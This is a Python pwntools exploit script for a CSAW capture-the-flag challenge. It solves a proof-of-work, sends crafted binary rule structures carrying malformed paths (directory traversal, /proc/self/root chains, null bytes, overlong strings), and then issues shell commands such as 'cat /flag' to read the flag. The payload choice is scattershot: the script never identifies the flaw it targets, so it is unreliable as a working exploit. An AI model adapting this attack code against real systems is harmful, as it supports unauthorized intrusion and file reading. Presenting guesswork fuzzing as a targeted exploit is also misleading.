#!/usr/bin/env python3
from pwn import *
import struct
import hashlib
import time

def solve_pow(prefix):
    i = 0
    while True:
        h = hashlib.sha256(str(i).encode()).hexdigest()
        if h.startswith(prefix):
            return str(i)
        i += 1

class Exploit:
    def __init__(self, host='pwn.chal.csaw.io', port=5000):
        self.r = remote(host, port)
        self.solve_challenge()

    def solve_challenge(self):
        challenge = self.r.recvline().decode().strip()
        prefix = challenge.split('=')[1].strip()
        solution = solve_pow(prefix)
        self.r.sendline(solution.encode())

    def create_rule(self, path, mode=0xB):  # 0xB = LDW_RULE_MODE_PREFDIR | LDW_RULE_FILT_PERMIT
        size = 16 + len(path)  # struct size + path length
        header = struct.pack('<IIII', size, mode, 0, 0)
        return header + path.encode()

    def send_rule(self, path):
        rule = self.create_rule(path)
        self.r.send(rule)
        time.sleep(0.1)
        return self.r.recvuntil(b'DEBUG', timeout=1)

    def trigger_vulnerability(self):
        # Create paths designed to trigger the vulnerability
        paths = [
            # Path with multiple symbolic links
            '/proc/self/root/' * 10,
            # Deep path traversal
            '/' + '../' * 50,
            # Long absolute path
            '/' + 'A' * 200,
            # Path with multiple components
            '/proc/../../' * 15,
            # Path with special characters
            '/dev/null\x00' + 'A' * 100,
            # Malformed path ending
            '/tmp/exploit' + '\xff' * 10
        ]

        print("[+] Sending malicious rules...")
        for path in paths:
            print(f"[*] Sending rule with path: {path[:50]}...")
            try:
                response = self.send_rule(path)
                if b'flag{' in response:
                    return self.extract_flag(response)
            except:
                continue

        # Try to access the flag after potential crash
        commands = [
            b"cat /flag.img",
            b"cat flag.img",
            b"cat /flag",
            b"dmesg | grep flag"
        ]

        print("[+] Attempting to read flag...")
        for cmd in commands:
            try:
                self.r.sendline(cmd)
                response = self.r.recvuntil(b'DEBUG', timeout=1)
                if b'flag{' in response:
                    return self.extract_flag(response)
            except:
                continue

        return None

    def extract_flag(self, data):
        try:
            flag = data[data.index(b'flag{'):].split(b'}')[0] + b'}'
            return flag.decode()
        except:
            return None

    def close(self):
        self.r.close()

def main():
    exploit = Exploit()
    flag = exploit.trigger_vulnerability()

    if flag:
        print(f"[+] Found flag: {flag}")
    else:
        print("[-] Failed to find flag")

    exploit.close()

if __name__ == "__main__":
    main()

